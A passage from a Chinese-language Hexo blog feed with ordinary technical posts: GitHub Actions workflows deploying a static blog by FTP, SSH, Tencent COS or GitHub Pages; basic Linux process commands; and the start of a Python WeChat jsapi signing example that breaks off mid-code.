class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">name:</span> <span class="hljs-string">Hexo博客持续集成</span><br><br><span class="hljs-attr">on:</span> <br>  <span class="hljs-attr">push:</span><br>    <span class="hljs-attr">branches:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">master</span><br>      <br><span class="hljs-attr">jobs:</span><br>  <span class="hljs-attr">build:</span> <br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span> <br><br>    <span class="hljs-attr">steps:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">检出仓库代码</span><br>      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@master</span><br><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">安装Node.js</span> <span class="hljs-number">11.</span><span class="hljs-string">x</span> <br>      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@master</span><br>      <span class="hljs-attr">with:</span><br>        <span class="hljs-attr">node-version:</span> <span class="hljs-string">&quot;11.x&quot;</span><br><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">安装Hexo依赖</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        npm install hexo-cli -g</span><br><span class="hljs-string">        npm install</span><br><span class="hljs-string"></span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">构建Hexo</span><br>      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">        hexo clean</span><br><span class="hljs-string">        hexo generate</span><br></code></pre></td></tr></table></figure><img src="/2021/07/newpost-18/image-20210730165401395.png" class="" title="image-20210730165401395"><h2 id="三、发布到你想要发布的地方（以下几种方式选一即可，也可多选）"><a href="#三、发布到你想要发布的地方（以下几种方式选一即可，也可多选）" class="headerlink" title="三、发布到你想要发布的地方（以下几种方式选一即可，也可多选）"></a>三、发布到你想要发布的地方（以下几种方式选一即可，也可多选）</h2><h3 id="3-1-发布到云服务器（以下几种方式选一即可）"><a href="#3-1-发布到云服务器（以下几种方式选一即可）" class="headerlink" title="3.1 发布到云服务器（以下几种方式选一即可）"></a>3.1 发布到云服务器（以下几种方式选一即可）</h3><h4 id="3-1-1-通过FTP方式（很慢，不推荐）"><a href="#3-1-1-通过FTP方式（很慢，不推荐）" class="headerlink" title="3.1.1 通过FTP方式（很慢，不推荐）"></a>3.1.1 通过FTP方式（很慢，不推荐）</h4><p>进入仓库-Settings-Secrets-New secret，分别新建三条名为<code>FTP_SERVER</code>、<code>FTP_USERNAME</code>和<code>FTP_PASSWORD</code>，值为FTP地址、FTP账号和FTP密码的secret，如需更多配置例如端口号等可以参考<a href="https://github.com/SamKirkland/FTP-Deploy-Action">FTP-Deploy-Action</a>。</p><p><strong>存储在Secrets里的内容是很安全的，只有仓库所有者和协作者有权使用，但也仅限于使用，没有人可以查看其内容。</strong></p><img src="/2021/07/newpost-18/image-20210730110052838.png" class="" title="image-20210730110052838"><p>将以下文件追加到仓库<code>\.github\workflows\main.yml</code>文件下后提交，注意缩进，<code>- name</code>要和上边的<code>- name</code>对齐。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">部署Hexo到云服务器</span><br>  <span class="hljs-attr">uses:</span> <span class="hljs-string">SamKirkland/FTP-Deploy-Action@4.1.0</span><br>  <span class="hljs-attr">with:</span><br>    <span class="hljs-attr">server:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.FTP_SERVER</span> <span class="hljs-string">&#125;&#125;</span><br>    <span class="hljs-attr">username:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.FTP_USERNAME</span> <span class="hljs-string">&#125;&#125;</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.FTP_PASSWORD</span> <span class="hljs-string">&#125;&#125;</span><br>    <span class="hljs-attr">local-dir:</span> <span class="hljs-string">./public/</span><br></code></pre></td></tr></table></figure><p>这个脚本在删除操作会报550错误，项目<code>Issues</code>也提到了这个问题，目前没有解决。可以通过在<code>with</code>里配置<code>dangerous-clean-slate</code>为<code>true</code>绕过这个问题，但是这会删除FTP所有文件后提交，会很慢。提交后就会自动部署，去服务器查看效果吧。</p><h4 id="3-1-2-通过SSH方式"><a href="#3-1-2-通过SSH方式" class="headerlink" title="3.1.2 通过SSH方式"></a>3.1.2 通过SSH方式</h4><p>进入仓库-Settings-Secrets-New secret，分别新建三条名为<code>SERVER_SSH_KEY</code>、<code>SERVER_HOST</code>和<code>SERVER_USER</code>，值为SSH私钥、SSH地址和SSH用户名的secret，如需更多配置例如端口号等可以参考<a href="https://github.com/easingthemes/ssh-deploy">ssh-deploy</a>。</p><p><strong>存储在Secrets里的内容是很安全的，只有仓库所有者和协作者有权使用，但也仅限于使用，没有人可以查看其内容。</strong></p><img src="/2021/07/newpost-18/image-20210730110052838.png" class="" title="image-20210730110052838"><p>将以下文件追加到仓库<code>\.github\workflows\main.yml</code>文件下后提交，注意缩进，<code>- name</code>要和上边的<code>- name</code>对齐。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">部署到云服务器</span><br>  <span class="hljs-attr">uses:</span> <span class="hljs-string">easingthemes/ssh-deploy@main</span><br>  <span class="hljs-attr">env:</span><br>    <span class="hljs-attr">SSH_PRIVATE_KEY:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.SERVER_SSH_KEY</span> <span class="hljs-string">&#125;&#125;</span><br>    <span class="hljs-attr">ARGS:</span> <span class="hljs-string">&quot;-avzr --delete&quot;</span><br>    <span class="hljs-attr">SOURCE:</span> <span class="hljs-string">&quot;./public/&quot;</span><br>    <span class="hljs-attr">REMOTE_HOST:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.SERVER_HOST</span> <span class="hljs-string">&#125;&#125;</span><br>    <span class="hljs-attr">REMOTE_USER:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.SERVER_USER</span> <span class="hljs-string">&#125;&#125;</span><br>    <span class="hljs-attr">TARGET:</span> <span class="hljs-string">&quot;/www/wwwroot/blog.ctftools.com/&quot;</span><br></code></pre></td></tr></table></figure><p>这个方式比FTP快非常多，通常数秒即可完成，FTP方式要数分钟。提交后就会自动部署，去服务器查看效果吧。</p><h3 id="3-2-发布到腾讯云COS"><a href="#3-2-发布到腾讯云COS" class="headerlink" title="3.2 发布到腾讯云COS"></a>3.2 发布到腾讯云COS</h3><p>进入仓库-Settings-Secrets-New secret，分别新建两条名为<code>TCLOUD_API_ID</code>和<code>TCLOUD_API_KEY</code>，值为腾讯云API秘钥<code>SecretId</code>与<code>SecretKey</code>的secret。</p><p><strong>存储在Secrets里的内容是很安全的，只有仓库所有者和协作者有权使用，但也仅限于使用，没有人可以查看其内容。</strong></p><img src="/2021/07/newpost-18/image-20210730110052838.png" class="" title="image-20210730110052838"><p>将以下文件追加到仓库<code>\.github\workflows\main.yml</code>文件下，将其中的<code>blog-1252906577</code>和<code>ap-shanghai</code>改为你自己的存储桶名称和地域，<code>https://blog.ctftools.com/</code>改为自己的域名后提交，注意缩进，<code>- name</code>要和上边的<code>- name</code>对齐。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">安装腾讯云依赖</span><br>  <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">    sudo pip install coscmd</span><br><span class="hljs-string">    sudo pip install tccli</span><br><span class="hljs-string"></span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">配置腾讯云依赖</span><br>  <span class="hljs-attr">env:</span><br>    <span class="hljs-attr">SECRET_ID:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.TCLOUD_API_ID</span> <span class="hljs-string">&#125;&#125;</span><br>    <span class="hljs-attr">SECRET_KEY:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.TCLOUD_API_KEY</span> <span class="hljs-string">&#125;&#125;</span><br>    <span class="hljs-attr">BUCKET:</span> <span class="hljs-string">blog-1252906577</span> <span class="hljs-comment">#改为自己的存储桶名称</span><br>    <span class="hljs-attr">REGION:</span> <span class="hljs-string">ap-shanghai</span> <span class="hljs-comment">#改为自己的地域</span><br>  <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">    coscmd config -a $SECRET_ID -s $SECRET_KEY -b $BUCKET -r $REGION</span><br><span class="hljs-string">    tccli configure set secretId $SECRET_ID</span><br><span class="hljs-string">    tccli configure set secretKey $SECRET_KEY</span><br><span class="hljs-string">    tccli configure set region $REGION</span><br><span class="hljs-string"></span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">上传到腾讯云COS并刷新CDN</span><br>  <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">    coscmd upload -rfs --delete ./public/ /</span><br><span class="hljs-string">    tccli cdn PurgePathCache --cli-unfold-argument --Paths https://blog.ctftools.com/ --FlushType flush</span><br></code></pre></td></tr></table></figure><p>如果不需要刷新CDN则可以简化如下</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">安装腾讯云依赖</span><br>  <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">    sudo pip install coscmd</span><br><span class="hljs-string"></span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">配置腾讯云依赖</span><br>  <span class="hljs-attr">env:</span><br>    <span class="hljs-attr">SECRET_ID:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.TCLOUD_API_ID</span> <span class="hljs-string">&#125;&#125;</span><br>    <span class="hljs-attr">SECRET_KEY:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.TCLOUD_API_KEY</span> <span class="hljs-string">&#125;&#125;</span><br>    <span class="hljs-attr">BUCKET:</span> <span class="hljs-string">blog-1252906577</span> <span class="hljs-comment">#改为自己的存储桶名称</span><br>    <span class="hljs-attr">REGION:</span> <span class="hljs-string">ap-shanghai</span> <span class="hljs-comment">#改为自己的地域</span><br>  <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">    coscmd config -a $SECRET_ID -s $SECRET_KEY -b $BUCKET -r $REGION</span><br><span class="hljs-string"></span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">上传到腾讯云COS并刷新CDN</span><br>  <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br>    <span class="hljs-string">coscmd</span> <span class="hljs-string">upload</span> <span class="hljs-string">-rfs</span> <span class="hljs-string">--delete</span> <span class="hljs-string">./public/</span> <span class="hljs-string">/</span><br></code></pre></td></tr></table></figure><p>更详细的教程，包括腾讯云相关配置可以参考<a href="/2021/07/newpost-20/">通过Github Actions部署静态网站到腾讯云COS，并自动刷新CDN</a>。提交后就会自动部署，去COS查看效果吧。</p><h3 id="3-3-发布到-github-pages"><a href="#3-3-发布到-github-pages" class="headerlink" title="3.3 发布到 github-pages"></a>3.3 发布到 github-pages</h3><p><strong>这一步的前提是你的hexo之前已经托管到github-pages，<code>_config.yml</code>文件中已经有类似下边的代码</strong></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">deploy:</span><br> <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br> <span class="hljs-attr">repo:</span> <span class="hljs-string">git@github.com:dr34m-cn/dr34m-cn.github.io.git</span><br> <span class="hljs-attr">branch:</span> <span class="hljs-string">master</span><br></code></pre></td></tr></table></figure><p>如果没有，可以参考<a href="/2017/12/post233/">Hexo安装配置并托管至github</a></p><p>进入仓库-Settings-Secrets-New secret，新建一条名为<code>HEXO_DEPLOY_PRIVATE_KEY</code>，值为<code>Github私钥</code>的secret。</p><p><strong>存储在Secrets里的内容是很安全的，只有仓库所有者和协作者有权使用，但也仅限于使用，没有人可以查看其内容。</strong></p><img src="/2021/07/newpost-18/image-20210730110052838.png" class="" title="image-20210730110052838"><p>将以下文件追加到仓库<code>\.github\workflows\main.yml</code>文件下，将其中的<code>名称</code>和<code>邮箱</code>改为你自己的后提交，注意缩进，<code>- name</code>要和上边的<code>- name</code>对齐。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">配置Github部署私钥</span><br>  <span class="hljs-attr">env:</span><br>    <span class="hljs-attr">HEXO_DEPLOY_PRIVATE_KEY:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.HEXO_DEPLOY_PRIVATE_KEY</span> <span class="hljs-string">&#125;&#125;</span><br>  <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">    mkdir -p ~/.ssh/</span><br><span class="hljs-string">    echo &quot;$HEXO_DEPLOY_PRIVATE_KEY&quot; &gt; ~/.ssh/id_rsa</span><br><span class="hljs-string">    chmod 600 ~/.ssh/id_rsa</span><br><span class="hljs-string">    ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts</span><br><span class="hljs-string"></span>    <br><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">配置Git信息</span><br>  <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">    git config --global user.name &#x27;名称&#x27;</span><br><span class="hljs-string">    git config --global user.email &#x27;邮箱&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">部署Hexo到Github</span><br>  <span class="hljs-attr">run:</span> <span class="hljs-string">hexo</span> <span class="hljs-string">deploy</span><br></code></pre></td></tr></table></figure><p>提交后就会自动部署，去github-pages查看效果吧。</p><h2 id="四、存档"><a href="#四、存档" class="headerlink" title="四、存档"></a>四、存档</h2><p>将以下文件追加到仓库<code>\.github\workflows\main.yml</code>文件下，然后提交，注意缩进，<code>- name</code>要和上边的<code>- name</code>对齐。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">打包压缩</span><br>  <span class="hljs-attr">run:</span> <span class="hljs-string">tar</span> <span class="hljs-string">-zcvf</span> <span class="hljs-string">release.tgz</span> <span class="hljs-string">public</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">发布</span> <span class="hljs-string">Release</span><br>  <span class="hljs-attr">id:</span> <span class="hljs-string">create_release</span><br>  <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/create-release@master</span><br>  <span class="hljs-attr">env:</span><br>    <span class="hljs-attr">GITHUB_TOKEN:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.GITHUB_TOKEN</span> <span class="hljs-string">&#125;&#125;</span> <span class="hljs-comment">#这个令牌是Actions提供的，你不需要创建自己的令牌</span><br>  <span class="hljs-attr">with:</span><br>    <span class="hljs-attr">tag_name:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">github.run_id</span> <span class="hljs-string">&#125;&#125;</span><br>    <span class="hljs-attr">release_name:</span> <span class="hljs-string">Release</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">github.run_id</span> <span class="hljs-string">&#125;&#125;</span><br>    <span class="hljs-attr">draft:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">prerelease:</span> <span class="hljs-literal">false</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">上传构建结果到</span> <span class="hljs-string">Release</span><br>  <span class="hljs-attr">id:</span> <span class="hljs-string">upload-release-asset</span><br>  <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/upload-release-asset@master</span><br>  <span class="hljs-attr">env:</span><br>    <span class="hljs-attr">GITHUB_TOKEN:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">secrets.GITHUB_TOKEN</span> <span class="hljs-string">&#125;&#125;</span><br>  <span class="hljs-attr">with:</span><br>    <span class="hljs-attr">upload_url:</span> <span class="hljs-string">$&#123;&#123;</span> <span class="hljs-string">steps.create_release.outputs.upload_url</span> <span class="hljs-string">&#125;&#125;</span><br>    <span class="hljs-attr">asset_path:</span> <span class="hljs-string">./release.tgz</span><br>    <span class="hljs-attr">asset_name:</span> <span class="hljs-string">release.tgz</span><br>    <span class="hljs-attr">asset_content_type:</span> <span class="hljs-string">application/x-tgz</span><br></code></pre></td></tr></table></figure><p>完成后可看到存档如下</p><img src="/2021/07/newpost-18/image-20210730174234824.png" class="" title="image-20210730174234824"><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>也可以参考<a href="https://github.com/dr34m-cn/hexo/blob/master/.github/workflows/main.yml">我的项目中的配置</a>，我的项目优先完成腾讯云COS部署，然后是托管到github，发布 Release。</p><p>参考文章：<a href="https://blog.csdn.net/u012208219/article/details/106883054#comments_15417337">利用GitHub+Actions自动部署Hexo博客</a>，<a href="https://moeci.com/posts/github-actions-hexo-ftp/">GitHub Actions 自动发布Hexo 并通过 FTP上传 到阿里云ECS</a>，<a href="https://blog.csdn.net/qq_39846820/article/details/115422544">githubActions部署文件到服务器</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>经验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常用的Linux进程基本命令</title>
    <link href="/2021/07/newpost-17/"/>
    <url>/2021/07/newpost-17/</url>
    
    <content type="html"><![CDATA[<h4 id="按内存或cpu占用排序"><a href="#按内存或cpu占用排序" class="headerlink" title="按内存或cpu占用排序"></a>按内存或cpu占用排序</h4><p>首先输入<code>top</code>命令，然后:</p><ul><li><p>按<code>P</code>-以 CPU 占用率大小的顺序排列进程列表</p></li><li><p>按<code>M</code>-以内存占用率大小的顺序排列进程列表</p></li></ul><span id="more"></span><table><thead><tr><th>序号</th><th>列名</th><th>含义</th></tr></thead><tbody><tr><td>1</td><td>PID</td><td>进程id</td></tr><tr><td>2</td><td>USER</td><td>进程所有者的用户名</td></tr><tr><td>3</td><td>RP</td><td>优先级</td></tr><tr><td>4</td><td>NI</td><td>nice值。负值表示高优先级，正值表示低优先级</td></tr><tr><td>5</td><td>VIRT</td><td>进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES</td></tr><tr><td>6</td><td>RES</td><td>进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA</td></tr><tr><td>7</td><td>SHR</td><td>共享内存大小，单位kb</td></tr><tr><td>8</td><td>S</td><td>进程状态(D=不可中断的睡眠状态,R=运行,S=睡眠,T=跟踪/停止,Z=僵尸进程)</td></tr><tr><td>9</td><td>%CPU</td><td>上次更新到现在的CPU时间占用百分比</td></tr><tr><td>10</td><td>%MEM</td><td>进程使用的物理内存百分比</td></tr><tr><td>11</td><td>TIME+</td><td>进程使用的CPU时间总计，单位1/100秒</td></tr><tr><td>12</td><td>COMMAND</td><td>命令名/命令行</td></tr></tbody></table><ul><li>按<code>q</code>退出</li></ul><h3 id="查询指定名称的进程"><a href="#查询指定名称的进程" class="headerlink" title="查询指定名称的进程"></a>查询指定名称的进程</h3><p>使用命令<code>ps -ef|grep xxxx</code>，其中<code>xxxx</code>替换为你想要查询的进程名，例如<code>ps -ef|grep python</code></p><table><thead><tr><th>列号</th><th>列名</th><th>含义</th></tr></thead><tbody><tr><td>1</td><td>USER</td><td>进程所有者的用户名</td></tr><tr><td>2</td><td>PID</td><td>进程id</td></tr><tr><td>3</td><td>PPID</td><td>父进程id</td></tr><tr><td>4</td><td>C</td><td>使用的资源百分比</td></tr><tr><td>5</td><td>STIME</td><td>系统启动时间</td></tr><tr><td>6</td><td>TTY</td><td>登入者的终端机位置</td></tr><tr><td>7</td><td>COMMAND</td><td>命令名/命令行</td></tr></tbody></table><h3 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h3><ul><li>根据进程id杀死进程<ul><li><code>kill xxxx</code>，<code>xxxx</code>替换为PID，即进程id，例如<code>kill 3781</code>，强制终止可以添加<code>-9</code>参数，例如<code>kill -9 3781</code></li></ul></li><li>根据名称杀死进程<ul><li><code>killall xxxx</code>，<code>xxxx</code>替换为进程名称，例如<code>killall python</code></li><li><code>pkill xxxx</code>，<code>xxxx</code>替换为进程名称，例如<code>pkill python</code></li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python实现微信jsapi签名</title>
    <link href="/2021/06/newpost-16/"/>
    <url>/2021/06/newpost-16/</url>
    
    <content type="html"><![CDATA[<ul><li>以下完整演示了获取access_token，获取ticket，最后签名返回前端全过程。</li></ul><span id="more"></span><ul><li>requirements.txt</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">requests</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">2.23</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">redis</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">3.5</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">tornado</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">6.0</span>.<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><ul><li>安装依赖</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install -r requirements.txt<br></code></pre></td></tr></table></figure><ul><li>调用，其中xxx改成当前前端页面地址，不要url编码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost:8060/getApi?url=xxx<br></code></pre></td></tr></table></figure><ul><li>程序，注意，程序没有对可能的错误做处理（因为几乎不会出错，如果出错，九成是因为ip白名单没有配置）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> redis<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">from</span> tornado.web <span class="hljs-keyword">import</span> Application, RequestHandler<br><span class="hljs-keyword">from</span> tornado.ioloop <span class="hljs-keyword">import</span> IOLoop<br><br><span class="hljs-comment"># 公众号id与秘钥</span><br>appId = <span class="hljs-string">&#x27;xxx&#x27;</span><br>appSecret = <span class="hljs-string">&#x27;xxx&#x27;</span><br><br><span class="hljs-comment"># 缓存的access_token与ticket在redis中的key</span><br>ack = <span class="hljs-string">&#x27;test_access_token&#x27;</span><br>tik = <span class="hljs-string">&#x27;test_ticket&#x27;</span><br><br><span class="hljs-comment"># redis主机和密码</span><br>redisHost = <span class="hljs-string">&#x27;xxx&#x27;</span><br>redisPassword = <span class="hljs-string">&#x27;xxx&#x27;</span><br><br>r = redis.Redis(host=redisHost, port=<span class="hljs-number">6379</span>, password=redisPassword, decode_responses=<span class="hljs-literal">True</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getTicket</span>():<br>    <span class="hljs-keyword">if</span> r.get(tik) <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">if</span> r.get(ack) <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            params_ack = &#123;<span class="hljs-string">&#x27;grant_type&#x27;</span>: <span class="hljs-string">&#x27;client_credential&#x27;</span>, <span class="hljs-string">&#x27;appid&#x27;</span>: appId, <span class="hljs-string">&#x27;secret&#x27;</span>: appSecret&#125;<br>            access_token_data = requests.get(<span class="hljs-string">&#x27;https://api.weixin.qq.com/cgi-bin/token&#x27;</span>, params=params_ack).text<br>            access_token = json.loads(access_token_data)[<span class="hljs-string">&#x27;access_token&#x27;</span>]<br>            r.<span class="hljs-built_in">set</span>(ack, access_token, ex=<span class="hljs-number">7100</span>)<br>        <span class="hljs-keyword">else</span>:<br>            access_token = r.get(ack)<br>        params_tik = &#123;<span class="hljs-string">&#x27;access_token&#x27;</span>: access_token, <span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;jsapi&#x27;</span>&#125;<br>        ticket_data = requests.get(<span 